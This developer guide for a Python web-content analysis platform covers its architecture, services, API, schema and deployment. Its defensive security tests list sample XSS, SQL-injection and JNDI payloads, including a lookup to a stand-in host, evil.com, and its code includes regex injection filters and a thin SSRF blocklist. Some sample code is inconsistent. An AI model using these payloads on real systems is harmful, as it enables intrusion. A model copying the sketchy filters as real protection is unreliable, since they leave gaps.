# Developer Guide

## Web Content Analysis Platform - Technical Implementation Guide

This guide provides comprehensive technical information for developers working with or contributing to the Web Content Analysis Platform. It covers architecture, implementation details, testing strategies, and deployment procedures.

## Table of Contents

1. [Architecture Overview](#architecture-overview)
2. [Development Environment](#development-environment)
3. [Core Components](#core-components)
4. [API Integration](#api-integration)
5. [Testing Framework](#testing-framework)
6. [Database Schema](#database-schema)
7. [Security Implementation](#security-implementation)
8. [Performance Optimization](#performance-optimization)
9. [Deployment Guide](#deployment-guide)
10. [Contributing Guidelines](#contributing-guidelines)

## Architecture Overview

### System Architecture

The platform implements a clean, layered architecture that separates concerns and enables scalable development:

```
┌─────────────────────────────────────────────────────────┐
│                 Presentation Layer                       │
│  ┌─────────────────┐    ┌─────────────────────────────┐ │
│  │   Streamlit UI  │    │      FastAPI REST API      │ │
│  │                 │    │                             │ │
│  │ • Interactive   │    │ • RESTful endpoints         │ │
│  │   Dashboard     │    │ • Request validation        │ │
│  │ • Bulk Analysis │    │ • Error handling           │ │
│  │ • RAG Interface │    │ • API documentation        │ │
│  └─────────────────┘    └─────────────────────────────┘ │
└─────────────────────────────────────────────────────────┘
                               │
┌─────────────────────────────────────────────────────────┐
│                Application Layer                         │
│  ┌─────────────────────────────────────────────────────┐ │
│  │              Business Services                       │ │
│  │                                                     │ │
│  │ • ContentAnalysisService                            │ │
│  │ • RAGKnowledgeService                               │ │
│  │ • SecurityValidationService                         │ │
│  │ • ReportGenerationService                           │ │
│  └─────────────────────────────────────────────────────┘ │
└─────────────────────────────────────────────────────────┘
                               │
┌─────────────────────────────────────────────────────────┐
│               Infrastructure Layer                       │
│  ┌───────────────┐  ┌──────────────┐  ┌──────────────┐ │
│  │  Web Scraping │  │ LLM Services │  │   Security   │ │
│  │               │  │              │  │              │ │
│  │ • Production  │  │ • Gemini API │  │ • URL        │ │
│  │   Scraper     │  │ • Claude API │  │   Validation │ │
│  │ • Content     │  │ • Fallback   │  │ • SSRF       │ │
│  │   Extraction  │  │   Handling   │  │   Protection │ │
│  └───────────────┘  └──────────────┘  └──────────────┘ │
└─────────────────────────────────────────────────────────┘
                               │
┌─────────────────────────────────────────────────────────┐
│                   Data Layer                            │
│  ┌─────────────────────────────────────────────────────┐ │
│  │                                                     │ │
│  │ • SQLite Database (Analysis History)                │ │
│  │ • Vector Embeddings (RAG Knowledge)                 │ │
│  │ • Session Management                                │ │
│  │ • Configuration Storage                             │ │
│  └─────────────────────────────────────────────────────┘ │
└─────────────────────────────────────────────────────────┘
```

### Design Principles

**Clean Architecture**
- Clear separation of concerns across layers
- Dependencies point inward toward the domain
- Framework-independent business logic

**SOLID Principles**
- Single Responsibility: Each class has one reason to change
- Open/Closed: Open for extension, closed for modification
- Liskov Substitution: Subtypes are substitutable for base types
- Interface Segregation: Client-specific interfaces
- Dependency Inversion: Depend on abstractions, not concretions

**Domain-Driven Design**
- Rich domain models with encapsulated business logic
- Ubiquitous language throughout the codebase
- Clear boundaries between different contexts

## Development Environment

### Prerequisites

```bash
Python 3.9+
pip or conda package manager
Git version control
IDE or text editor (VS Code recommended)
```

### Environment Setup

1. **Clone and Setup Repository**
```bash
git clone https://github.com/yourusername/web-content-analysis.git
cd web-content-analysis

# Create and activate virtual environment
python -m venv .venv
source .venv/bin/activate  # On Windows: .venv\Scripts\activate

# Install development dependencies
pip install -r requirements.txt
pip install -r requirements-dev.txt  # Development tools
```

2. **Environment Configuration**
```bash
cp .env.example .env
# Edit .env with your development configuration
```

3. **Development Tools Setup**
```bash
# Install pre-commit hooks
pre-commit install

# Set up development database
python scripts/setup_dev_db.py

# Run initial tests to verify setup
pytest tests/ -v
```

### Development Workflow

1. **Feature Development**
```bash
# Create feature branch
git checkout -b feature/your-feature-name

# Make changes with tests
# Run tests frequently
pytest tests/unit/ -v

# Commit with meaningful messages
git commit -m "Add: descriptive commit message"
```

2. **Code Quality Checks**
```bash
# Format code
black src/ tests/

# Sort imports
isort src/ tests/

# Type checking
mypy src/

# Linting
flake8 src/ tests/

# Security analysis
bandit -r src/
```

3. **Testing Strategy**
```bash
# Unit tests (fast, isolated)
pytest tests/unit/ -v

# Integration tests (slower, external dependencies)
pytest tests/integration/ -v

# Full test suite with coverage
pytest --cov=src --cov-report=html
```

## Core Components

### Domain Models

**AnalysisResult** - Core business entity representing a website analysis
```python
from dataclasses import dataclass
from typing import Optional, Dict, Any
from datetime import datetime
from enum import Enum

class AnalysisStatus(Enum):
    PENDING = "pending"
    IN_PROGRESS = "in_progress"
    COMPLETED = "completed"
    FAILED = "failed"

class AnalysisType(Enum):
    BASIC = "basic"
    COMPREHENSIVE = "comprehensive"
    DETAILED = "detailed"

@dataclass
class AnalysisResult:
    analysis_id: str
    url: str
    status: AnalysisStatus
    analysis_type: AnalysisType
    metrics: Optional[Dict[str, float]] = None
    insights: Optional[Dict[str, Any]] = None
    processing_time: float = 0.0
    cost: float = 0.0
    created_at: datetime = None
    error_message: Optional[str] = None
```

**ScrapedContent** - Extracted website content
```python
@dataclass
class ScrapedContent:
    url: str
    title: str
    main_content: str
    meta_description: str
    headings: List[str]
    word_count: int
    extracted_at: datetime
    
    def get_content_summary(self) -> str:
        """Generate a summary of the scraped content."""
        return f"{self.title}: {self.main_content[:200]}..."
```

### Application Services

**ContentAnalysisService** - Orchestrates the analysis workflow
```python
class ContentAnalysisService:
    def __init__(
        self,
        scraper: WebScrapingInterface,
        llm_service: LLMServiceInterface,
        security_service: SecurityServiceInterface
    ):
        self.scraper = scraper
        self.llm_service = llm_service
        self.security_service = security_service
    
    async def analyze_url(
        self,
        url: str,
        analysis_type: AnalysisType = AnalysisType.COMPREHENSIVE
    ) -> AnalysisResult:
        """Analyze a single website URL."""
        # Validate URL security
        if not await self.security_service.validate_url(url):
            raise SecurityValidationError(f"URL failed security validation: {url}")
        
        # Scrape website content
        scraped_content = await self.scraper.scrape_website(url)
        
        # Generate AI analysis
        analysis_request = self._create_analysis_request(scraped_content, analysis_type)
        llm_response = await self.llm_service.analyze_content(analysis_request)
        
        # Create and return result
        return self._create_analysis_result(url, scraped_content, llm_response)
```

**RAGKnowledgeService** - Manages the knowledge repository
```python
class RAGKnowledgeService:
    def __init__(
        self,
        embedding_model: SentenceTransformerInterface,
        database: DatabaseInterface,
        llm_service: LLMServiceInterface
    ):
        self.embedding_model = embedding_model
        self.database = database
        self.llm_service = llm_service
    
    async def add_website(self, analysis_result: AnalysisResult) -> None:
        """Add analyzed website to knowledge repository."""
        # Chunk content for better retrieval
        chunks = self._chunk_content(analysis_result.scraped_content)
        
        # Generate embeddings
        embeddings = await self.embedding_model.embed_texts([chunk.content for chunk in chunks])
        
        # Store in database
        await self.database.store_website_chunks(analysis_result.url, chunks, embeddings)
    
    async def query_repository(
        self,
        question: str,
        website_filter: Optional[str] = None,
        limit: int = 5
    ) -> RAGResponse:
        """Query the knowledge repository with natural language."""
        # Generate question embedding
        question_embedding = await self.embedding_model.embed_texts([question])
        
        # Retrieve relevant chunks
        relevant_chunks = await self.database.search_similar_chunks(
            question_embedding[0], website_filter, limit
        )
        
        # Generate response using LLM
        context = self._prepare_context(relevant_chunks)
        response = await self.llm_service.generate_rag_response(question, context)
        
        return RAGResponse(
            answer=response,
            sources=relevant_chunks,
            method="AI Response",
            confidence_score=self._calculate_confidence(relevant_chunks)
        )
```

### Infrastructure Components

**ProductionWebScraper** - Robust web scraping implementation
```python
class ProductionWebScraper:
    def __init__(self, timeout: int = 30, max_retries: int = 3):
        self.timeout = timeout
        self.max_retries = max_retries
        self.session = self._create_session()
    
    async def scrape_website(self, url: str) -> ScrapedContent:
        """Scrape website content with error handling and retries."""
        for attempt in range(self.max_retries):
            try:
                response = await self._fetch_with_timeout(url)
                html_content = response.text
                
                # Parse and extract content
                soup = BeautifulSoup(html_content, 'html.parser')
                extracted_content = self._extract_content(soup, url)
                
                return ScrapedContent(
                    url=url,
                    title=self._extract_title(soup),
                    main_content=extracted_content,
                    meta_description=self._extract_meta_description(soup),
                    headings=self._extract_headings(soup),
                    word_count=len(extracted_content.split()),
                    extracted_at=datetime.utcnow()
                )
            
            except Exception as e:
                if attempt == self.max_retries - 1:
                    raise ScrapingError(f"Failed to scrape {url}: {str(e)}")
                await asyncio.sleep(2 ** attempt)  # Exponential backoff
```

**SecurityService** - Comprehensive security validation
```python
class SecurityService:
    def __init__(self):
        self.url_validator = URLValidator()
        self.rate_limiter = RateLimiter()
        self.input_sanitizer = InputSanitizer()
    
    async def validate_url(self, url: str) -> bool:
        """Comprehensive URL security validation."""
        # Basic format validation
        if not self.url_validator.is_valid_format(url):
            return False
        
        # SSRF protection
        if self.url_validator.is_private_ip(url):
            return False
        
        # Domain blacklist check
        if self.url_validator.is_blacklisted_domain(url):
            return False
        
        # Rate limiting
        if not await self.rate_limiter.check_rate_limit(url):
            return False
        
        return True
    
    def sanitize_input(self, user_input: str) -> str:
        """Sanitize user input to prevent injection attacks."""
        # Remove potentially dangerous characters
        sanitized = self.input_sanitizer.remove_dangerous_chars(user_input)
        
        # Escape HTML entities
        sanitized = self.input_sanitizer.escape_html(sanitized)
        
        # Validate length
        if len(sanitized) > 1000:
            raise ValueError("Input too long")
        
        return sanitized
```

## API Integration

### FastAPI Application Structure

```python
# backend/api/main.py
from fastapi import FastAPI, HTTPException, Depends
from fastapi.middleware.cors import CORSMiddleware
from typing import Optional, List

app = FastAPI(
    title="Web Content Analysis API",
    description="AI-powered website content analysis",
    version="1.0.0",
    docs_url="/api/docs"
)

# Middleware configuration
app.add_middleware(
    CORSMiddleware,
    allow_origins=["http://localhost:3000", "http://localhost:8501"],
    allow_credentials=True,
    allow_methods=["GET", "POST", "PUT", "DELETE"],
    allow_headers=["*"]
)

# Dependency injection
async def get_content_analysis_service() -> ContentAnalysisService:
    # Initialize and return service instance
    pass

async def get_rag_service() -> RAGKnowledgeService:
    # Initialize and return service instance
    pass

# API endpoints
@app.post("/api/analyze", response_model=AnalysisResponse)
async def analyze_content(
    request: AnalysisRequest,
    service: ContentAnalysisService = Depends(get_content_analysis_service)
):
    """Analyze single website content."""
    try:
        result = await service.analyze_url(
            url=str(request.url),
            analysis_type=AnalysisType(request.analysis_type)
        )
        return AnalysisResponse.from_domain_model(result)
    except SecurityValidationError as e:
        raise HTTPException(status_code=422, detail=str(e))
    except ScrapingError as e:
        raise HTTPException(status_code=503, detail=str(e))
```

### Request/Response Models

```python
# API models for request/response handling
from pydantic import BaseModel, HttpUrl, validator
from typing import Optional, List, Dict, Any

class AnalysisRequest(BaseModel):
    url: HttpUrl
    analysis_type: str = "comprehensive"
    quality_preference: str = "balanced"
    max_cost: float = 0.05
    
    @validator('analysis_type')
    def validate_analysis_type(cls, v):
        valid_types = ["basic", "comprehensive", "detailed"]
        if v not in valid_types:
            raise ValueError(f"analysis_type must be one of {valid_types}")
        return v

class AnalysisResponse(BaseModel):
    analysis_id: str
    url: str
    status: str
    executive_summary: Optional[str] = None
    metrics: Optional[Dict[str, float]] = None
    insights: Optional[Dict[str, List[str]]] = None
    processing_time: float
    cost: float
    created_at: str
    
    @classmethod
    def from_domain_model(cls, result: AnalysisResult) -> 'AnalysisResponse':
        return cls(
            analysis_id=result.analysis_id,
            url=result.url,
            status=result.status.value,
            metrics=result.metrics,
            insights=result.insights,
            processing_time=result.processing_time,
            cost=result.cost,
            created_at=result.created_at.isoformat()
        )
```

## Testing Framework

### Test Structure

The testing framework follows a comprehensive approach with multiple test categories:

```
tests/
├── unit/                   # Fast, isolated tests
│   ├── test_domain/
│   ├── test_application/
│   └── test_infrastructure/
├── integration/           # Component integration tests
├── security/             # Security-focused tests
├── performance/          # Performance and load tests
├── rag_integration/      # RAG system tests
└── fixtures/            # Test data and mocks
```

### Unit Testing Examples

```python
# tests/unit/test_content_analysis_service.py
import pytest
from unittest.mock import Mock, AsyncMock
from src.application.services.content_analysis import ContentAnalysisService
from src.domain.models import AnalysisType, AnalysisResult

class TestContentAnalysisService:
    @pytest.fixture
    def mock_dependencies(self):
        return {
            'scraper': Mock(),
            'llm_service': Mock(),
            'security_service': Mock()
        }
    
    @pytest.fixture
    def service(self, mock_dependencies):
        return ContentAnalysisService(**mock_dependencies)
    
    @pytest.mark.asyncio
    async def test_analyze_url_success(self, service, mock_dependencies):
        # Arrange
        url = "https://example.com"
        mock_dependencies['security_service'].validate_url = AsyncMock(return_value=True)
        mock_dependencies['scraper'].scrape_website = AsyncMock(return_value=Mock())
        mock_dependencies['llm_service'].analyze_content = AsyncMock(return_value=Mock())
        
        # Act
        result = await service.analyze_url(url, AnalysisType.COMPREHENSIVE)
        
        # Assert
        assert isinstance(result, AnalysisResult)
        assert result.url == url
        mock_dependencies['security_service'].validate_url.assert_called_once_with(url)
    
    @pytest.mark.asyncio
    async def test_analyze_url_security_failure(self, service, mock_dependencies):
        # Arrange
        url = "https://malicious.com"
        mock_dependencies['security_service'].validate_url = AsyncMock(return_value=False)
        
        # Act & Assert
        with pytest.raises(SecurityValidationError):
            await service.analyze_url(url, AnalysisType.BASIC)
```

### Integration Testing

```python
# tests/integration/test_api_endpoints.py
import pytest
from fastapi.testclient import TestClient
from backend.api.main import app

class TestAnalysisEndpoints:
    @pytest.fixture
    def client(self):
        return TestClient(app)
    
    def test_analyze_url_success(self, client):
        # Test successful URL analysis
        request_data = {
            "url": "https://example.com",
            "analysis_type": "comprehensive"
        }
        
        response = client.post("/api/analyze", json=request_data)
        
        assert response.status_code == 200
        data = response.json()
        assert "analysis_id" in data
        assert data["url"] == "https://example.com"
    
    def test_analyze_invalid_url(self, client):
        # Test invalid URL handling
        request_data = {
            "url": "not-a-valid-url"
        }
        
        response = client.post("/api/analyze", json=request_data)
        
        assert response.status_code == 422
```

### Security Testing

```python
# tests/security/test_security_validation.py
import pytest
from src.infrastructure.security import SecurityService

class TestSecurityValidation:
    @pytest.fixture
    def security_service(self):
        return SecurityService()
    
    @pytest.mark.asyncio
    async def test_ssrf_protection(self, security_service):
        # Test SSRF protection against private IPs
        private_urls = [
            "http://127.0.0.1:8080",
            "http://10.0.0.1",
            "http://192.168.1.1"
        ]
        
        for url in private_urls:
            is_valid = await security_service.validate_url(url)
            assert is_valid is False, f"Should block private IP: {url}"
    
    def test_input_sanitization(self, security_service):
        # Test input sanitization
        malicious_inputs = [
            "<script>alert('xss')</script>",
            "'; DROP TABLE users; --",
            "${jndi:ldap://evil.com/a}"
        ]
        
        for malicious_input in malicious_inputs:
            sanitized = security_service.sanitize_input(malicious_input)
            assert "<script>" not in sanitized
            assert "DROP TABLE" not in sanitized
            assert "jndi:" not in sanitized
```

## Database Schema

### SQLite Schema Design

**Analysis History Table**
```sql
CREATE TABLE analysis_history (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    analysis_id VARCHAR(50) UNIQUE NOT NULL,
    url TEXT NOT NULL,
    status VARCHAR(20) NOT NULL,
    analysis_type VARCHAR(20) NOT NULL,
    metrics TEXT,  -- JSON blob
    insights TEXT,  -- JSON blob
    processing_time REAL,
    cost REAL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

CREATE INDEX idx_analysis_url ON analysis_history(url);
CREATE INDEX idx_analysis_created_at ON analysis_history(created_at);
```

**RAG Knowledge Repository Tables**
```sql
CREATE TABLE websites (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    url TEXT UNIQUE NOT NULL,
    title TEXT,
    description TEXT,
    added_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    last_analyzed TIMESTAMP,
    chunk_count INTEGER DEFAULT 0
);

CREATE TABLE content_chunks (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    website_id INTEGER NOT NULL,
    content TEXT NOT NULL,
    embedding BLOB,  -- Serialized vector embedding
    metadata TEXT,   -- JSON blob with chunk metadata
    chunk_index INTEGER,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (website_id) REFERENCES websites(id) ON DELETE CASCADE
);

CREATE INDEX idx_website_id ON content_chunks(website_id);
CREATE INDEX idx_chunk_index ON content_chunks(chunk_index);
```

### Database Access Layer

```python
# src/infrastructure/database/repository.py
import sqlite3
import json
import pickle
from typing import List, Optional, Dict, Any
from datetime import datetime

class AnalysisRepository:
    def __init__(self, db_path: str):
        self.db_path = db_path
        self._initialize_database()
    
    def _initialize_database(self):
        with sqlite3.connect(self.db_path) as conn:
            conn.execute("""
                CREATE TABLE IF NOT EXISTS analysis_history (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    analysis_id VARCHAR(50) UNIQUE NOT NULL,
                    url TEXT NOT NULL,
                    status VARCHAR(20) NOT NULL,
                    analysis_type VARCHAR(20) NOT NULL,
                    metrics TEXT,
                    insights TEXT,
                    processing_time REAL,
                    cost REAL,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            """)
    
    def save_analysis(self, result: AnalysisResult) -> None:
        with sqlite3.connect(self.db_path) as conn:
            conn.execute("""
                INSERT OR REPLACE INTO analysis_history 
                (analysis_id, url, status, analysis_type, metrics, insights, 
                 processing_time, cost, created_at)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
            """, (
                result.analysis_id,
                result.url,
                result.status.value,
                result.analysis_type.value,
                json.dumps(result.metrics) if result.metrics else None,
                json.dumps(result.insights) if result.insights else None,
                result.processing_time,
                result.cost,
                result.created_at
            ))
    
    def get_analysis_by_id(self, analysis_id: str) -> Optional[AnalysisResult]:
        with sqlite3.connect(self.db_path) as conn:
            conn.row_factory = sqlite3.Row
            cursor = conn.execute("""
                SELECT * FROM analysis_history WHERE analysis_id = ?
            """, (analysis_id,))
            row = cursor.fetchone()
            
            if row:
                return self._row_to_analysis_result(row)
            return None
    
    def _row_to_analysis_result(self, row: sqlite3.Row) -> AnalysisResult:
        return AnalysisResult(
            analysis_id=row['analysis_id'],
            url=row['url'],
            status=AnalysisStatus(row['status']),
            analysis_type=AnalysisType(row['analysis_type']),
            metrics=json.loads(row['metrics']) if row['metrics'] else None,
            insights=json.loads(row['insights']) if row['insights'] else None,
            processing_time=row['processing_time'],
            cost=row['cost'],
            created_at=datetime.fromisoformat(row['created_at'])
        )
```

## Security Implementation

### SSRF Protection

```python
# src/infrastructure/security/url_validator.py
import ipaddress
from urllib.parse import urlparse
from typing import Set

class URLValidator:
    def __init__(self):
        self.blacklisted_domains = {
            'localhost',
            '127.0.0.1',
            '0.0.0.0'
        }
        self.private_ip_ranges = [
            ipaddress.ip_network('10.0.0.0/8'),
            ipaddress.ip_network('172.16.0.0/12'),
            ipaddress.ip_network('192.168.0.0/16'),
            ipaddress.ip_network('127.0.0.0/8')
        ]
    
    def is_valid_format(self, url: str) -> bool:
        try:
            parsed = urlparse(url)
            return parsed.scheme in ['http', 'https'] and parsed.netloc
        except Exception:
            return False
    
    def is_private_ip(self, url: str) -> bool:
        try:
            parsed = urlparse(url)
            hostname = parsed.hostname
            
            if not hostname:
                return True
            
            # Check if it's an IP address
            try:
                ip = ipaddress.ip_address(hostname)
                return any(ip in network for network in self.private_ip_ranges)
            except ValueError:
                # Not an IP address, check against domain blacklist
                return hostname.lower() in self.blacklisted_domains
        except Exception:
            return True  # Err on the side of caution
    
    def is_blacklisted_domain(self, url: str) -> bool:
        try:
            parsed = urlparse(url)
            domain = parsed.netloc.lower()
            return domain in self.blacklisted_domains
        except Exception:
            return True
```

### Input Sanitization

```python
# src/infrastructure/security/input_sanitizer.py
import html
import re
from typing import Dict, Any

class InputSanitizer:
    def __init__(self):
        # Patterns for dangerous content
        self.dangerous_patterns = [
            r'<script[^>]*>.*?</script>',  # Script tags
            r'javascript:',                # JavaScript URLs
            r'on\w+\s*=',                 # Event handlers
            r'<iframe[^>]*>.*?</iframe>', # Iframes
            r'\$\{.*?\}',                 # Template injection
            r'<%.*?%>',                   # Server-side includes
        ]
        
        # SQL injection patterns
        self.sql_injection_patterns = [
            r'(union|select|insert|update|delete|drop|create|alter)\s',
            r'(--|;|/\*|\*/)',
            r'(\bor\b|\band\b)\s+\w+\s*(=|like)',
        ]
    
    def sanitize_input(self, user_input: str) -> str:
        if not isinstance(user_input, str):
            raise ValueError("Input must be a string")
        
        # Length validation
        if len(user_input) > 10000:
            raise ValueError("Input exceeds maximum length")
        
        # Remove dangerous patterns
        sanitized = user_input
        for pattern in self.dangerous_patterns:
            sanitized = re.sub(pattern, '', sanitized, flags=re.IGNORECASE)
        
        # Check for SQL injection attempts
        for pattern in self.sql_injection_patterns:
            if re.search(pattern, sanitized, re.IGNORECASE):
                raise ValueError("Potentially malicious input detected")
        
        # HTML escape
        sanitized = html.escape(sanitized)
        
        return sanitized.strip()
    
    def sanitize_json_payload(self, payload: Dict[str, Any]) -> Dict[str, Any]:
        """Recursively sanitize JSON payload."""
        if isinstance(payload, dict):
            return {
                key: self.sanitize_json_payload(value) 
                for key, value in payload.items()
            }
        elif isinstance(payload, list):
            return [self.sanitize_json_payload(item) for item in payload]
        elif isinstance(payload, str):
            return self.sanitize_input(payload)
        else:
            return payload
```

## Performance Optimization

### Async Processing

```python
# Efficient bulk analysis with controlled concurrency
import asyncio
from asyncio import Semaphore
from typing import List

class BulkAnalysisProcessor:
    def __init__(self, max_concurrent: int = 5):
        self.semaphore = Semaphore(max_concurrent)
        self.analysis_service = ContentAnalysisService()
    
    async def process_bulk_analysis(
        self, 
        urls: List[str], 
        analysis_type: AnalysisType
    ) -> List[AnalysisResult]:
        """Process multiple URLs with controlled concurrency."""
        tasks = [
            self._analyze_with_semaphore(url, analysis_type) 
            for url in urls
        ]
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # Filter out exceptions and return successful results
        return [
            result for result in results 
            if isinstance(result, AnalysisResult)
        ]
    
    async def _analyze_with_semaphore(
        self, 
        url: str, 
        analysis_type: AnalysisType
    ) -> AnalysisResult:
        """Analyze URL with semaphore control."""
        async with self.semaphore:
            return await self.analysis_service.analyze_url(url, analysis_type)
```

### Caching Strategy

```python
# Simple caching implementation for analysis results
from functools import lru_cache
import hashlib
import json

class AnalysisCache:
    def __init__(self, max_size: int = 1000):
        self.max_size = max_size
        self.cache = {}
    
    def _generate_cache_key(self, url: str, analysis_type: AnalysisType) -> str:
        """Generate cache key from URL and analysis type."""
        key_data = f"{url}:{analysis_type.value}"
        return hashlib.md5(key_data.encode()).hexdigest()
    
    def get_cached_result(
        self, 
        url: str, 
        analysis_type: AnalysisType
    ) -> Optional[AnalysisResult]:
        """Retrieve cached analysis result."""
        cache_key = self._generate_cache_key(url, analysis_type)
        return self.cache.get(cache_key)
    
    def cache_result(
        self, 
        url: str, 
        analysis_type: AnalysisType, 
        result: AnalysisResult
    ):
        """Cache analysis result."""
        if len(self.cache) >= self.max_size:
            # Simple LRU eviction - remove oldest entry
            oldest_key = next(iter(self.cache))
            del self.cache[oldest_key]
        
        cache_key = self._generate_cache_key(url, analysis_type)
        self.cache[cache_key] = result
```

## Deployment Guide

### Docker Configuration

```dockerfile
# Dockerfile
FROM python:3.9-slim

# Set working directory
WORKDIR /app

# Install system dependencies
RUN apt-get update && apt-get install -y \
    gcc \
    && rm -rf /var/lib/apt/lists/*

# Copy requirements and install Python dependencies
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

# Copy application code
COPY . .

# Create non-root user
RUN useradd -m -u 1001 appuser && chown -R appuser:appuser /app
USER appuser

# Expose port
EXPOSE 8000

# Run application
CMD ["uvicorn", "backend.api.main:app", "--host", "0.0.0.0", "--port", "8000"]
```

```yaml
# docker-compose.yml
version: '3.8'

services:
  web-content-analysis:
    build: .
    ports:
      - "8000:8000"
    environment:
      - GOOGLE_API_KEY=${GOOGLE_API_KEY}
      - ANTHROPIC_API_KEY=${ANTHROPIC_API_KEY}
      - DATABASE_URL=sqlite:///data/app.db
    volumes:
      - ./data:/app/data
    restart: unless-stopped
  
  streamlit:
    build: 
      context: .
      dockerfile: Dockerfile.streamlit
    ports:
      - "8501:8501"
    environment:
      - API_BASE_URL=http://web-content-analysis:8000
    depends_on:
      - web-content-analysis
    restart: unless-stopped
```

### Production Configuration

```python
# Production configuration
import os
from pathlib import Path

class ProductionConfig:
    # Database settings
    DATABASE_URL = os.getenv("DATABASE_URL", "sqlite:///data/production.db")
    RAG_DATABASE_URL = os.getenv("RAG_DATABASE_URL", "sqlite:///data/rag_production.db")
    
    # API settings
    MAX_CONCURRENT_ANALYSES = int(os.getenv("MAX_CONCURRENT_ANALYSES", "5"))
    DEFAULT_TIMEOUT = int(os.getenv("DEFAULT_TIMEOUT", "30"))
    RATE_LIMIT_PER_MINUTE = int(os.getenv("RATE_LIMIT_PER_MINUTE", "100"))
    
    # Security settings
    SECRET_KEY = os.getenv("SECRET_KEY")
    ALLOWED_HOSTS = os.getenv("ALLOWED_HOSTS", "localhost").split(",")
    
    # LLM settings
    GOOGLE_API_KEY = os.getenv("GOOGLE_API_KEY")
    ANTHROPIC_API_KEY = os.getenv("ANTHROPIC_API_KEY")
    
    # Logging
    LOG_LEVEL = os.getenv("LOG_LEVEL", "INFO")
    
    @classmethod
    def validate_config(cls):
        """Validate production configuration."""
        required_vars = ["SECRET_KEY", "GOOGLE_API_KEY", "ANTHROPIC_API_KEY"]
        missing = [var for var in required_vars if not getattr(cls, var)]
        
        if missing:
            raise ValueError(f"Missing required environment variables: {missing}")
```

## Contributing Guidelines

### Code Style

The project follows strict code quality standards:

```python
# .pre-commit-config.yaml
repos:
  - repo: https://github.com/psf/black
    rev: 23.1.0
    hooks:
      - id: black
        language_version: python3.9
  
  - repo: https://github.com/pycqa/isort
    rev: 5.12.0
    hooks:
      - id: isort
  
  - repo: https://github.com/pycqa/flake8
    rev: 6.0.0
    hooks:
      - id: flake8
        additional_dependencies: [flake8-docstrings]
  
  - repo: https://github.com/pre-commit/mirrors-mypy
    rev: v1.0.1
    hooks:
      - id: mypy
```

### Pull Request Process

1. **Fork and Branch**
   ```bash
   git fork https://github.com/original/web-content-analysis.git
   git checkout -b feature/your-feature-name
   ```

2. **Development Process**
   - Write tests for new functionality
   - Ensure all existing tests pass
   - Follow code style guidelines
   - Update documentation as needed

3. **Quality Checks**
   ```bash
   # Run full test suite
   pytest tests/ -v --cov=src
   
   # Code quality checks
   black src/ tests/
   isort src/ tests/
   flake8 src/ tests/
   mypy src/
   ```

4. **Submit Pull Request**
   - Clear, descriptive title
   - Detailed description of changes
   - Reference relevant issues
   - Include test results and coverage

### Release Process

1. **Version Management**
   - Follow semantic versioning (MAJOR.MINOR.PATCH)
   - Update version in `__init__.py` and `pyproject.toml`
   - Create comprehensive changelog

2. **Testing and Validation**
   - Full test suite execution
   - Performance benchmarks
   - Security audit
   - Documentation review

3. **Deployment**
   - Tag release in Git
   - Build and publish Docker images
   - Update production documentation
   - Monitor deployment health

---

This developer guide provides comprehensive technical information for working with the Web Content Analysis Platform. For specific questions or clarifications, please refer to the code documentation or submit issues to the GitHub repository.
